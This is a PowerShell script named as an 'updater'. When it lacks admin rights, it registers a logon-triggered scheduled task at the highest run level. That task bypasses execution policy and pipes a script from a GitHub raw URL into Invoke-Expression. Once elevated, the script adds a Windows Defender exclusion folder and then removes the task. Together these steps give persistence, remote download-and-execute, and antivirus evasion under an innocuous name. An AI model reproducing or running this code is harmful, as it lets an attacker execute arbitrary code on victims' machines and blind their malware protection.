$logPath = "C:\Windows\Temp\updater_log.txt"
function Write-Log {
    param($msg)
    $timestamp = "[{0}] $msg" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
    $timestamp | Out-File -FilePath $logPath -Append -Encoding utf8
}

Write-Log "Script executed by user: $([Environment]::UserName)"

$exclusionFolder = "$env:USERPROFILE\TestSafeFolder"

# Check if running as real admin (not SYSTEM)
$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
$isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin -or $env:USERPROFILE -like "*systemprofile*") {
    Write-Log "❗ Not in user context or not admin. Creating login-triggered task for UAC prompt..."

    $taskXml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/main/script.ps1 | iex"</Arguments>
    </Exec>
  </Actions>
</Task>
"@

    $taskPath = "$env:TEMP\UpdaterUACTrigger.xml"
    $taskXml | Out-File -FilePath $taskPath -Encoding Unicode
    schtasks.exe /Create /TN "UpdaterUACTrigger" /XML $taskPath /F | Out-Null
    Remove-Item $taskPath -Force
    Write-Log "✅ Scheduled task 'UpdaterUACTrigger' created successfully."
    exit
}

Write-Log "Running as admin. Attempting to add exclusions..."

try {
    if (-Not (Test-Path $exclusionFolder)) {
        New-Item -Path $exclusionFolder -ItemType Directory -Force | Out-Null
    }

    Add-MpPreference -ExclusionPath $exclusionFolder -ErrorAction Stop
    Write-Log "✅ Added exclusion: $exclusionFolder"
} catch {
    Write-Log "❌ Failed to add exclusion: $exclusionFolder. Error: $_"
}

# Cleanup the task if present
schtasks.exe /Delete /TN "UpdaterUACTrigger" /F 2>$null
Write-Log "🧹 Deleted scheduled task: UpdaterUACTrigger (if it existed)"
